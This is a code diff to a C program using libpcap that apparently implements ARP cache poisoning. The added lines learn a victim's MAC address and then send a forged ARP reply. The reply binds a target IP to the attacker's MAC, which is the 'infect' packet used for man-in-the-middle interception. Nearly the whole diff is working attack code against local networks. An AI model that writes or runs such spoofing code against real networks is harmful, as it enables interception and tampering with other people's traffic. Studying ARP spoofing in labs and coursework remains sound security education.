@@ -23,7 +23,7 @@
 #define ETHERNET 1
 #define ARP_REQUEST 1          /* ARP Request             */ 
 #define ARP_REPLY 2            /* ARP Reply               */ 
-#define ARP_SIZE 42	       /* ARP Packet Size 	  */
+#define PACKET_SIZE 42	       /* Packet Size	 	  */
 #define ETHER_HLEN 14	       /* ethernet header size    */
 typedef struct arpheader { 
     uint16_t htype;            /* Hardware Type           */ 
@@ -53,6 +53,7 @@ int main(int argc, char *argv[])
 
 	struct ether_header *ethhdr;
 	char packet[100];
+	char infect[100];
 
 	arphdr_t *arpheader = NULL;
 
@@ -93,7 +94,7 @@ int main(int argc, char *argv[])
 	ethhdr = (struct ether_header *)packet;
 	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
 	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = '\xff';
-	for(int j=0;j<ETH_ALEN;j++) ethhdr->ether_shost[j] = attacker_mac[j];
+	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
 	
 	/* Make ARP packet */
 	arpheader = (struct arpheader *)(packet+14);
@@ -108,7 +109,7 @@ int main(int argc, char *argv[])
 	arpheader->tpa = inet_addr(sender_ip);
 
 	/* Send ARP request */
-	pcap_sendpacket(handle, packet, ARP_SIZE);	
+	pcap_sendpacket(handle, packet, PACKET_SIZE);	
 	/* int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
 	 * sends a raw packet through the network interface.
 	 * returns 0 on success and -1 on failure.
@@ -121,9 +122,9 @@ int main(int argc, char *argv[])
 		res = pcap_next_ex(handle, &header, &reply_packet);
 		if(res < 0) exit(1);
 		else if(res == 0) {
-			if(pcap_sendpacket(handle, packet, ARP_SIZE)) {
-                		exit(1);
-           		}
+			//if(pcap_sendpacket(handle, packet, PACKET_SIZE)) {
+                	//	exit(1);
+           		//}
 			continue;
 		}
 
@@ -134,7 +135,31 @@ int main(int argc, char *argv[])
 		// error handling
 		
 		memcpy(sender_mac, reply_arp->sha, 6);
-	}	
+		break;
+	}
+
+	//printf("%x %x %x %x %x %x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 
+
+	/* Make Ethernet packet */
+	ethhdr = (struct ether_header *)infect;
+	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
+	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = sender_mac[i];
+	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
+	
+	/* Make ARP packet */
+	arpheader = (struct arpheader *)(infect+14);
+	arpheader->htype = ntohs(ETHERNET);
+	arpheader->ptype = ntohs(ETHERTYPE_IP);
+	arpheader->hlen = sizeof(arpheader->sha); 
+	arpheader->plen = sizeof(arpheader->spa);
+	arpheader->oper = ntohs(ARP_REPLY);
+	memcpy(arpheader->sha, attacker_mac, 6);
+	arpheader->spa = inet_addr(target_ip);
+	memcpy(arpheader->tha, sender_mac,6);
+	arpheader->tpa = inet_addr(sender_ip);
+
+	/* Send ARP request */
+	pcap_sendpacket(handle, infect, PACKET_SIZE);			
 
 	/* Close handle */
 	pcap_close(handle);
